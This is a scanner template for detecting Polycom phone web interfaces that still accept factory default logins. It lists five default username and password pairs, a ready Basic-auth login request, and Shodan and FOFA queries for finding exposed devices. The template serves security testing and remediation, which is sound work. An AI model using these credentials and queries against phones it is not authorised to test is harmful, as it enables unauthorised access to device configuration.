id: polycom-default-login

info:
  name: Polycom Web Configuration Utility - Default Login
  author: mr-pmillz
  severity: high
  description: |
    Polycom phone Web Configuration Utility accepts default credentials for administrator or user accounts when the factory passwords have not been changed. This template checks the authentication form for the login success response.
  impact: |
    An attacker can access phone configuration with the permissions of the compromised administrator or user account.
  remediation: |
    Change both administrator and user passwords, and restrict access to the Web Configuration Utility to trusted management hosts.
  reference:
    - https://support.ringcentral.com/article-v2/Default-Username-Password-Polycom-Phones.html
    - https://h30434.www3.hp.com/t5/Poly-Phones-Knowledge-Base/FAQ-What-is-the-warning-indication-triangle-exclamation-mark/ta-p/9510744
  classification:
    cwe-id: CWE-1392
  metadata:
    verified: true
    max-request: 5
    vendor: polycom
    product: uc_software
    shodan-query: http.html:"Polycom Web Configuration Utility"
    fofa-query: body="Polycom Web Configuration Utility"
  tags: default-login,polycom,voip,intrusive

http:
  - raw:
      - |
        POST /form-submit/auth.htm HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}

    payloads:
      username:
        - Polycom
        - Admin
        - User
        - User
        - User
      password:
        - "456"
        - "456"
        - "123"
        - "789"
        - ""
    attack: pitchfork
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'lockparams|SUCCESS|0'

      - type: word
        part: content_type
        words:
          - 'text/plain'

      - type: word
        part: header
        words:
          - 'Polycom'
        case-insensitive: true

      - type: status
        status:
          - 200
